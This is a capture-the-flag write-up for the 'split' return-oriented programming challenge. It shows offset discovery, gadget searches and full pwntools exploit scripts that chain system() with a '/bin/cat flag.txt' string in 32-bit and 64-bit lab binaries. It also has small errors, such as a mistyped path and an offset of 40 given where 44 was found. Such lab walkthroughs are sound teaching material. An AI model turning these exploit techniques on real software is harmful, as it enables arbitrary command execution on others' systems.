Here is the hint for the second ROP challenge **Split.**

The elements that allowed you to complete ret2win are still present, they've just been split apart.
Find them and recombine them using a short ROP chain.

I'll let you in on a secret: that useful string `"/bin/cat flag.txt"` is still present in this binary, as is a call to `system().` It's just a case of finding them and chaining them together to make the magic happen. 

Before we begin let's check the **permissions on our target binary.** We're employing ROP due to the presence of `NX`, but we'd feel pretty stupid if it turned out that none of these binaries were compiled with NX enabled. **We'll check that this isn't the case and we can't just `jmp esp` with a little shellcode.**
`rabin2 -I` split lets us know that NX is indeed enabled: (Equivalent to performing a checksec)

![file](/post-images/split/01file.png)

We first run the program to check the programs behaviour.

![run](/post-images/split/02run.png)

Now that you've gathered the elements of your exploit you can start to piece them together, you want to call **system()** with the `"/bin/cat flag.txt"` string as the only argument. You'll also have to start dealing with the differences between the various architectures' calling conventions. 
**You can do the x86 challenge with just a 2 link chain and the x86_64 challenge with a 3 link chain.** 

Lets Begin with the **32 bit** challenge;
---

We can use `rabin2 -z` to check for strings and their addresses.
We can also use `rabin2 -1` to check for the program functions, and we can spot the **system** function.
we have a `usefulfunction()` which contains the `system` call.

![strings](/post-images/split/03strings.png)

![binaddress](/post-images/split/04binaddress%20(copy%201).png)

Run `gdb-pwndbg`, check and disassemble functions of **main** and **usefulFunctions()**. We can get the address of **/bin/cat/flag.txt**, using search. 

![usefulFunction](/post-images/split/05usefulFunctions%20(copy%201).png)

Its important to search for the whole string `/bin/cat/flag.txt` as the string since searching for the address of `flag.txt` only brings the offset of that part of the string only while we need the whole string.
Since we have both addresses, the `systemcall()` and the string `/bin/cat/flag.txt`, we can now create a ROP chain. We can generate the cyclic pattern using `cyclic 100 ` and input so that the system crashes. 

![crash](/post-images/split/06crash%20(copy%201).png)

We get an offset of **44 bytes**, which we write `44 bytes` to the buffer before we can overwrite the system.

![offset](/post-images/split/08offset%20(copy%201).png)

So lets start manually;
We print out the payload  with 40 A's + the system address and the bin/cat/flag.txt. and remember to put them in **little endian format**. I wrote a code for converting the addresses to little endian because it is a task to do it manually. 

Here is the code :
```python
def hex_to_little_endian():
    # Ask user for architecture
    while True:
        arch = input("Is the address from a 32-bit or 64-bit program? (32/64): ").strip()
        if arch in ['32', '64']:
            byte_size = 4 if arch == '32' else 8
            break
        print("Invalid input. Please enter '32' or '64'.")

    # Ask user for hex address
    while True:
        hex_str = input("Enter the hexadecimal address (with or without 0x): ").strip()
        
        # Remove 0x prefix if present and validate hex digits
        hex_clean = hex_str.lower().replace('0x', '')
        
        if not all(c in '0123456789abcdef' for c in hex_clean):
            print("Invalid hexadecimal format. Try again.")
            continue
            
        # Check if address fits in the specified architecture
        if len(hex_clean) > byte_size * 2:  # Each byte is 2 hex digits
            print(f"Address too large for {arch}-bit architecture (max {byte_size} bytes). Try again.")
            continue
            
        break

    # Pad with leading zeros to match architecture size
    hex_padded = hex_clean.zfill(byte_size * 2)
    
    # Convert to little-endian
    bytes_le = bytes.fromhex(hex_padded)[::-1]
    
    # Generate escaped format
    escaped = ''.join(f'\\x{byte:02x}' for byte in bytes_le)
    
    # Output results
    print("\nResults:")
    print(f"Little Endian: {escaped}")
    print(f"Raw bytes: {bytes_le!r}")

if __name__ == "__main__":
    hex_to_little_endian()
```

![endian](/post-images/split/11little%20endian%20(copy%201).png)


![endian](/post-images/split/09littlendian%20(copy%201).png)

With this we can run the split and pass in the payload as input/ run with the payload then we get the flag.
To get a more visualized form we can set a breakpoint at `system` using `b system` then we can `run < payload`. With that we can see the system being called at the `EIP <--call address`.
We can see the `bin/cat/flag.txt` is on the stack then hit continue `c` till we get to the flag.

![](/post-images/split/10flag%20(copy%201).png)

So for automatically run it we can use `pwntools`
here is the payload;

```python
from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './split32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Locate the functions/strings we need
system_addr = elf.symbols['system']
bincat_addr = next(elf.search(b'/bin/cat'))

# Print out the target address
info("%#x system", system_addr)
info("%#x /bin/cat", bincat_addr)

# We will send a 'cyclic' pattern which overwrites the return address on the stack
payload = cyclic(100)

# PWN
io.sendlineafter('>', payload)

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of EIP at the time of crashing
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))

# Craft a new payload which puts system('/bin/cat flag.txt') at correct offset we have used fit to set the offeset.
payload = fit({
    eip_offset: [elf.symbols.system,
                 0x0, # overwriting the return pointer with any 4 bytes
                 bincat_addr]
}
)

# Send the payload to a new copy of the process
io = start()
io.sendline(payload)
io.recv()

# Get our flag!
flag = io.recvline()
success(flag)
```

we run it and get the flag.

![pwndbg](/post-images/split/12pwndbg.png)

There is an autopwn script for this challenge, without using all this code.

we will have to look for the offset manually.
There is no need looking for the system address we can go straight to the bin/cat/
We will us `ROP object`

## Autopwn

```python
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./split32', checksec=False)
p = process()

# How many bytes to EIP?
padding = 44

# Locate the functions/strings we need
bincat_addr = next(elf.search(b'/bin/cat'))

# Print out the target address
info("%#x /bin/cat", bincat_addr)

# Get ROP gadgets
rop = ROP(elf)
# Create rop chain calling system(and pass it'/bin/cat flag.txt')
rop.system(bincat_addr)

# pprint(rop.gadgets)
print(rop.chain()) # info(rop.chain())

# Inject rop chain at correct offset
payload = fit({padding: rop.chain()})

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
```


Step 2 64 bit program
---
Just like the 32 bit but with 64 bit specific
 things.
 We perform the usuall running of the program and see that it crashes with a segmentation fault. It crashes With us not seeing whats in the `instruction pointer RIP`. We can use the last 4 bytes at the end of the `RBP (Base pointer)` WE get 40 bytes.
Just like the 32 bit we check the system call and the /bin/cat/flag.txt addresses and use them.

> Unlike the **32_bit** structure where the **bin/cat/flag.txt_is_called_form_the_stack** because we were able to place the system call over the Instruction pointer then followed it with the command that we wanted on the stack which was the /bin/cat/flag.txt. In the **64_bit** structure we are not able to place it in the `RIP`, it is required to be in the `RDI` so we will need to get the /bin/cat/flag.txt onto that register. We will use the `pop rdi` gadget to do this.

We can look for an instruction that is in the **RDI** to pop a value from the stack to the register(**RDI**). We can use a tool called Ropper.
We can input `ropper -f` to get a list of all the gadgets and their addresses.
so we can search for the `pop rdi` gadget using ;

> ropper -f ./split64 --search "pop rdi"

![ropper](/post-images/split/16poprdi.png)

With the  rop gadget we can create a chain of instructions that will pop the /bin/cat/flag.txt. So we will have to input it in first then the system call then the bin/cat

> python2 -c 'print "A" * offset + **rop_gadget** + **/bin/cat/flag.txt** + **systemcall()**' > payload

![ROPchain](/post-images/split/14payload1.png)

This is because it will have to place the `bin/cat/flag.txt` on the RDI (`rop_gadget`) address first then the system call will coninue and call the object in the RDI.
It is advisable to take the addresses from your GDB rather than the `rabin2` mostly for the system call because the addresses are not the same



Prints the flag with a segmentation fault.
---
We can break the system to see the inner workings of the system, `p system`
We can break at the system to check the **RDI**

pwntools script
---

```python
from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './split'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Locate the functions/strings we need
pop_rdi_gadget = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
# ropper -f split --search "pop rdi; ret;"
# pop_rdi_gadget = 0x4007c3
bincat_addr = next(elf.search(b'/bin/cat'))
system_addr = elf.symbols['system']

# Print out the target address
info("%#x pop rdi; ret;", pop_rdi_gadget)
info("%#x /bin/cat", bincat_addr)
info("%#x system", system_addr)

# We will send a 'cyclic' pattern which overwrites the return address on the stack
payload = cyclic(100)

# PWN
io.sendlineafter('>', payload)

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing (SP for ARM)
stack = core.rsp
info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
offset = cyclic_find(pattern)
info("%r pattern (offset: %r)", pattern, offset)

# ====================
# Now we know the offset from the beginning of our controlled data.
# ====================

# Craft a new payload which puts system('/bin/cat flag.txt') at correct offset
# Note that we have to call pop_rdi gadget here
payload = flat(
    asm('nop') * offset,
    pop_rdi_gadget,
    bincat_addr,
    system_addr
)

# Send the payload to a new copy of the process
io = start()
io.sendline(payload)
io.recv()

# Get our flag!
flag = io.recvline()
success(flag)
```

autopwn script
-----

```python
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./split', checksec=False)
p = process()

# How many bytes to return address?
padding = 40

# Locate the functions/strings we need
bincat_addr = next(elf.search(b'/bin/cat'))

# ROP
rop = ROP(elf)  # Load rop gadgets
rop.system(bincat_addr)  # Call system with /bin/cat flag.txt address

pprint(rop.gadgets)
print(rop.dump())

# Rop chain
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Craft a new payload which puts the "target" address at the correct offset
payload = flat(
    asm('nop') * padding,
    rop_chain
)

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
```
***Thats_it_for_today_on_splits***
